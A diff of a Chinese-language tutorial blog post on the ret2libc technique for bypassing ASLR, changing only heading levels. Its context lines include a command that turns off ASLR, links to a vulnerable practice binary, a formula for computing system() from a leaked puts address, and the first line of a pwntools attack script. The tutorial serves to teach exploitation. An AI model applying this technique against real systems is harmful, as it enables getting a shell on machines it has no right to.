@@ -5,7 +5,7 @@ layout: post
 categories: tutorials
 ---
 
-# 情景描述
+## 情景描述
 
 随着保护的加强，比如加入了`ASLR(Address Space Layout Randomization),地址空间格局的随机化`保护，这时我们所获取的各个函数地址都在变化中变得不再可用（在本地我们可用），这时我们还要使用libc中的system()函数获取shell的话，那我们该怎么办呢？
 
@@ -18,7 +18,7 @@ echo 0 > /proc/sys/kernel/randomize_va_space # 2 - trun on
 exit
 ```
 
-# 漏洞分析
+## 漏洞分析
 
 本节示例的漏洞代码可以在此处下载： [ret2libc3](http://od7mpc53s.bkt.clouddn.com/ret2libc3) & [libc.so.6](http://od7mpc53s.bkt.clouddn.com/libc.so.6)
 当然这里的libc.so.6最好是用自己系统的。我们可以通过`ldd`命令查看
@@ -64,7 +64,7 @@ system_addr = puts_addr + (libc_system - libc_puts)
 08048460 <puts@plt>:
 ```
 
-# 攻击代码
+## 攻击代码
 
 ``` python
 from pwn import *
